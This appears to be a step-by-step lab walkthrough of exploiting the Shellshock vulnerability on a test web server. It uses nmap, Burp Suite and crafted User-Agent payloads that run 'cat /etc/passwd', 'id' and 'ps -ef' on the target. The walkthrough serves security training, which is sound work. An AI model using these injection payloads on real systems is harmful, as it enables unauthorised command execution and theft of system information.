Here are the summary steps from the document in bullet points:

1. Step 1: Start a terminal and check the IP address of the host.
    
    - Command: `ip addr`
2. Step 2: Run an Nmap scan on the target IP to find open ports (IP address is 192.242.220.3).
    
    - Command: `nmap 192.242.220.3`
    - Identify that port 80 is open.
3. Step 3: Start Firefox and navigate to the target IP. Observe a website running on port 80.
    
4. Step 4: Right-click and select "View Page Source" to inspect the web page.
    
    - Identify that a CGI script is running on the target server.
5. Step 5: Use the Nmap NSE script to check if the server is vulnerable to Shellshock attack.
    
    - Command: `nmap --script http-shellshock --script-args “http-shellshock.uri=/gettime.cgi” 192.242.220.3`
    - Determine that the server is vulnerable to Shellshock attack.
6. Step 6: Search for an available exploit for the Shellshock vulnerability.
    
7. Step 7: Access the GitHub link that contains the steps to exploit the vulnerability.
    
    - URL: [https://github.com/opsxcq/exploit-CVE-2014-6271](https://github.com/opsxcq/exploit-CVE-2014-6271)
    - Learn that the attacker needs to craft a malicious user-agent to exploit the vulnerability.
8. Step 8: Configure Firefox to use Burp Suite and select the "Burp Suite" option in FoxyProxy.
    
9. Step 9: Start Burp Suite, navigate to the Web Application Analysis menu, and select "burpsuite."
    
10. Step 10: Reload the page and intercept the request with Burp Suite. Send the request to the Repeater tab.
    
11. Step 11: Modify the User-Agent and inject the malicious payload.
    
    - Payload: `() { :; }; echo; echo; /bin/bash -c 'cat /etc/passwd'`
    - Click the Send button to execute the payload.
12. Step 12: Modify the payload to execute the 'id' command.
    
    - Payload: `() { :; }; echo; echo; /bin/bash -c 'id'`
13. Step 13: Modify the payload to execute the 'ps -ef' command.
    
    - Payload: `() { :; }; echo; echo; /bin/bash -c 'ps -ef'`

These steps illustrate the process of identifying and exploiting the Shellshock vulnerability on the target server using a crafted malicious payload and Burp Suite.
